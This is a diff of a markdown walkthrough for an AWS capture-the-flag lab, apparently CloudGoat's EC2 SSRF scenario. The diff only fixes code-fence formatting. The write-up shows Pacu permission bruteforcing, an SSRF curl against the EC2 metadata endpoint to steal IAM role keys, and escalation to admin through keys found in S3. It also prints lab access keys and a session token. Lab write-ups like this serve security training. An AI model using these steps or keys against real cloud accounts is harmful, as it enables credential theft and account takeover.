@@ -18,7 +18,8 @@ Starting as the IAM user Solus, the attacker discovers they have ReadOnly permis
 hardcoded secrets lead them to an EC2 instance running a web application that is vulnerable to server-side request 
 forgery (SSRF). After exploiting the vulnerable app and acquiring keys from the EC2 metadata service, the attacker 
 gains access to a private S3 bucket with a set of keys that allow them to invoke the Lambda function and complete 
-the scenario. ```
+the scenario. 
+```
 
  
 
@@ -99,41 +100,48 @@ We’ll come back to those keys in a second, lets grab the Lambda function and s
 ```
 def handler(event, context):
     # You need to invoke this function to win!
-    return "You win!"```
+    return "You win!"
+```
 
 Nothing of real interest here just the function that needs to be called to 'win' the challenge.
 
 Lets add those keys discovered from the environment variables and see what they do:
 
 ```
-aws sts get-caller-identity --profile souls-lambda```
+aws sts get-caller-identity --profile souls-lambda
+```
 
 Neat its a new user ‘wrex’
 
 Lets use wrex to enumerate:
 ```
 run lambda__enum —region us-east-1   #Fails no permissions
-run iam__bruteforce_permissions    #Works 86 allow permissions found looks like everything is tied to an ec2```
+run iam__bruteforce_permissions    #Works 86 allow permissions found looks like everything is tied to an ec2
+```
 
 Lets see what instances are running:
 
 ```
-aws ec2 describe-instances --output table --profile wrex --region us-east-1```
+aws ec2 describe-instances --output table --profile wrex --region us-east-1
+```
 
 Looks like there is 1 instance running. It has a public IP, and the security groups seem to allow ssh and internet access based on there names. Lets confirm that by first checking the ‘http’ group:
 
 ```
-aws ec2 describe-security-groups --group-id sg-01ba15f6900fb29b5 --output table --profile wrex —region us-east-1```
+aws ec2 describe-security-groups --group-id sg-01ba15f6900fb29b5 --output table --profile wrex —region us-east-1
+```
 
 The output shows that tcp 80 is allowed in to the instance. Lets check the ’ssh’ group
 
 ```
-aws ec2 describe-security-groups --group-id  sg-0c7cb6af2ad26f721 --output table --profile wrex —region us-east-1```
+aws ec2 describe-security-groups --group-id  sg-0c7cb6af2ad26f721 --output table --profile wrex —region us-east-1
+```
 
 Looks like we also have ssh access to the box. So, what’s running on this IP on port 80? Lets curl it!
 
 ```
-curl http://ec2-54-85-35-195.compute-1.amazonaws.com```
+curl http://ec2-54-85-35-195.compute-1.amazonaws.com
+```
 
 Comes back with the response:
 
@@ -291,7 +299,8 @@ All good signs!
 
 Lets see if we can find credentials!
 ```
-curl http://ec2-54-85-35-195.compute-1.amazonaws.com?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cgid0aj9eyqxxk/```
+curl http://ec2-54-85-35-195.compute-1.amazonaws.com?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cgid0aj9eyqxxk/
+```
 
 Boom, keys!
 
@@ -304,14 +313,16 @@ Boom, keys!
   "SecretAccessKey" : "i0i/UIiETrHbCZ6rnxc96avTMr9NHAL5aSGZb6V2",
   "Token" : "AgoJb3JpZ2luX2VjEIb//////////wEaCXVzLWVhc3QtMSJGMEQCIB0MPkK2gpMCcwIHR2w20WG",
   "Expiration" : "2019-09-26T20:13:50Z"
-}```
+}
+```
 
 Lets set these as another profile and see what we can do.
 
 Dropping them into pacu they seem pretty limited, if we brute force 
 
 ```
-run iam__bruteforce_permissions```
+run iam__bruteforce_permissions
+```
 
 The only thing these credentials provide access to is s3.lets see what’s there. We’ll add the session to aws credentials and include the token with
 aws_session_token
@@ -319,23 +330,27 @@ aws_session_token
 Now we can ls s3
 
 ```
-aws s3 ls --profile ec2```
+aws s3 ls --profile ec2
+```
 
 Interesting a bucket, with a file called admin-user.txt what’s in there?
 
 ```
 cat admin-user.txt 
 AKIA5X73I5MBL22TOFFD
-mGJdldTovP4OIxSMUiodhdPyAjdbbTQTtxFt+piP```
+mGJdldTovP4OIxSMUiodhdPyAjdbbTQTtxFt+piP
+```
 
 Lets plug those into pacu/aws cli and see what we can do
 
 ```
-aws configure —profile admin```
+aws configure —profile admin
+```
 
 Validate they work:
 ```
-aws get-caller-identity —profile admin```
+aws get-caller-identity —profile admin
+```
 
 Neat now we’re ’Shepard’ 
 
@@ -343,12 +358,14 @@ Set these keys in pacu and we can now run admin functions!
 
 ```
 run aws__enum_spend
-run aws__enum_account```
+run aws__enum_account
+```
 
 Knowing that we have full admin rights to this account we can now run the Lambda script:
 
 ```
-aws lambda invoke --function-name cg-lambda-cgid0aj9eyqxxk --profile admin --region us-east-1 ./win.txt```
+aws lambda invoke --function-name cg-lambda-cgid0aj9eyqxxk --profile admin --region us-east-1 ./win.txt
+```
 
 We run this and get a json response with StatusCode 200 and when we cat win.txt we are greeted with “You win!"
 
